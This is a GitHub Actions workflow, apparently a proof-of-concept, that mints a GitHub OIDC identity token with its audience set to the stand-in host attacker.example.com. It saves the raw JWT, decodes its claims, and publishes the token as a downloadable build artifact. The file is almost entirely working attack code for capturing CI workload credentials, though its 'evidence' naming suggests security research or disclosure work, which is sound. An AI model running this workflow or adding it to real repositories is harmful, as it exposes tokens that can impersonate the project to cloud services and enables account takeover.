name: OIDC JWT artifact capture
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read
  actions: write

jobs:
  jwt-capture:
    runs-on: ubuntu-latest
    steps:
      - name: Mint OIDC token and save to file
        run: |
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://attacker.example.com" \
              | python3 -c "import json,sys; print(json.loads(sys.stdin.read()).get('value',''))")
            
            mkdir -p /tmp/jwt-evidence
            echo "$JWT" > /tmp/jwt-evidence/oidc-token.jwt
            
            # Decode header
            echo "$JWT" | cut -d. -f1 | python3 -c "
import base64,sys,json
s = sys.stdin.read().strip()
s += '=' * (4 - len(s) % 4)
d = json.loads(base64.urlsafe_b64decode(s))
json.dump(d, open('/tmp/jwt-evidence/header.json','w'), indent=2)
print('Header decoded')
"
            # Decode payload  
            echo "$JWT" | cut -d. -f2 | python3 -c "
import base64,sys,json
s = sys.stdin.read().strip()
s += '=' * (4 - len(s) % 4)
d = json.loads(base64.urlsafe_b64decode(s))
json.dump(d, open('/tmp/jwt-evidence/claims.json','w'), indent=2)
print('Claims decoded')
for k,v in sorted(d.items()):
    print(f'  {k}: {v}')
"
          else
            echo "OIDC not available"
            exit 1
          fi
          
      - name: Upload JWT evidence
        uses: actions/upload-artifact@v4
        with:
          name: oidc-jwt-evidence
          path: /tmp/jwt-evidence/
          retention-days: 1
